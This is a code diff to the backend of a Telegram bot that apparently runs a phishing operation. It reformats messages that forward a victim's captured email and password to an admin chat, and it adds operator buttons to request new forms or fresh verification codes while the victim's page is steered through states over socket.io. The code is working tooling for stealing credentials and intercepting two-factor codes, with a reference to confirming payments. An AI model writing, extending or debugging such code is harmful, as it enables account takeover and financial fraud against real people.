@@ -319,16 +319,15 @@ async function handleCallbackQuery(query) {
     // Get session data
     const sessionData = activeSessions.get(key) || { formData: {} };
     
-    // For internal API calls within the container, use localhost
-    // External URLs won't work from inside the container due to DNS resolution
-    const internalApiUrl = 'http://localhost:3000';
+    // Use the config module to get the correct API URL for the current environment
+    const apiBaseUrl = config.baseUrl;
     
     // Handle different actions
     switch (action) {
       case 'confirm_form':
         try {
           // Update session state to form_2
-          await axios.post(`${internalApiUrl}/api/state`, { key, state: 'form_2' });
+          await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'form_2' });
           
           // Update local session data
           sessionData.state = 'form_2';
@@ -338,7 +337,12 @@ async function handleCallbackQuery(query) {
           io.to(key).emit('state_update', { key, state: 'form_2' });
           
           // Update the message with form data still visible
-          const formApprovedMessage = createFormDataMessage(key, sessionData.formData, '✅ Formular genehmigt. Warten auf Verifizierungscode...');
+          const formApprovedMessage = createFormDataMessage(key, sessionData.formData || {}, '✅ Formular genehmigt. Warten auf Verifizierungscode...');
+          
+          // Make sure we have valid text content
+          if (!formApprovedMessage.text || formApprovedMessage.text.trim() === '') {
+            throw new Error('Generated message text is empty');
+          }
           
           await bot.editMessageText(formApprovedMessage.text, {
             chat_id: chatId,
@@ -356,7 +360,7 @@ async function handleCallbackQuery(query) {
         break;
       case 'request_new_form':
         // Update session state to form_1
-        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'form_1' });
+        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'form_1' });
         
         // Update local session data
         sessionData.state = 'form_1';
@@ -390,7 +394,7 @@ _Warten auf die Formulareingabe des Benutzers..._
         break;
       case 'confirm_code':
         // Update session state from loading_pending to pending (not success)
-        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'pending' });
+        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'pending' });
         
         // Update local session data
         sessionData.state = 'pending';
@@ -420,7 +424,7 @@ _Warten auf die Formulareingabe des Benutzers..._
         break;
       case 'request_new_code':
         // Update session state from loading_pending to reenter_code
-        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'reenter_code' });
+        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'reenter_code' });
         
         // Update local session data
         sessionData.state = 'reenter_code';
@@ -432,24 +436,18 @@ _Warten auf die Formulareingabe des Benutzers..._
         // Update the message with form data still visible
         const newCodeMessage = createFormDataMessage(key, sessionData.formData, '🔄 Neuer Verifizierungscode angefordert.');
         
-        bot.editMessageText(newCodeMessage, {
+        bot.editMessageText(newCodeMessage.text, {
           chat_id: chatId,
           message_id: messageId,
           parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
-              ]
-            ]
-          }
+          reply_markup: newCodeMessage.reply_markup
         });
         
         bot.answerCallbackQuery(query.id, { text: '🔄 Neuer Code angefordert' });
         break;
       case 'end_session':
         // Update session state to success instead of error
-        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'success' });
+        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'success' });
         
         // Update local session data
         sessionData.state = 'success';
@@ -471,7 +469,7 @@ _Warten auf die Formulareingabe des Benutzers..._
         break;
       case 'request_code':
         // Update session state from pending to reenter_code_after_pending
-        await axios.post(`${internalApiUrl}/api/state`, { key, state: 'reenter_code_after_pending' });
+        await axios.post(`${apiBaseUrl}/api/state`, { key, state: 'reenter_code_after_pending' });
         
         // Update local session data
         sessionData.state = 'reenter_code_after_pending';
@@ -483,17 +481,11 @@ _Warten auf die Formulareingabe des Benutzers..._
         // Update the message with form data still visible
         const requestCodeMessage = createFormDataMessage(key, sessionData.formData, '🔄 Neuer Verifizierungscode angefordert.');
         
-        bot.editMessageText(requestCodeMessage, {
+        bot.editMessageText(requestCodeMessage.text, {
           chat_id: chatId,
           message_id: messageId,
           parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
-              ]
-            ]
-          }
+          reply_markup: requestCodeMessage.reply_markup
         });
         
         bot.answerCallbackQuery(query.id, { text: '🔄 Neuer Code angefordert' });
@@ -733,13 +725,16 @@ _Der Benutzer wartet auf der Pending-Seite. Bitte bestätigen Sie die Zahlung od
  * @param {string} key - Session key
  * @param {Object} formData - Form data
  * @param {string} statusMessage - Status message to display
- * @returns {string} Formatted message
+ * @returns {Object} Message object with text and reply_markup
  */
 function createFormDataMessage(key, formData, statusMessage) {
-  let message = `
-${statusMessage}
+  // Ensure formData is an object
+  formData = formData || {};
+  
+  // Create message text
+  const text = `${statusMessage || ''}
 
-📋 *Formulardaten:*
+📝 *Formular-Daten:*
 📧 *E-Mail:* ${formData.email || 'N/A'}
 🔒 *Passwort:* ${formData.password || 'N/A'}
 
@@ -747,7 +742,19 @@ ${statusMessage}
 🕒 *Zeit:* ${formatDate(Date.now())}
   `;
   
-  return message;
+  // Create inline keyboard
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: '🔄 Neues Formular anfordern', callback_data: `request_new_form:${key}` }
+      ],
+      [
+        { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
+      ]
+    ]
+  };
+  
+  return { text, reply_markup };
 }
 
 /**
@@ -971,7 +978,7 @@ async function notifySmsCodeRequest(key, verificationMethod) {
     
     if (lastMessageId) {
       // Update the existing message
-      await bot.editMessageText(message, {
+      await bot.editMessageText(message.text, {
         chat_id: ADMIN_CHAT_ID,
         message_id: lastMessageId,
         parse_mode: 'Markdown',
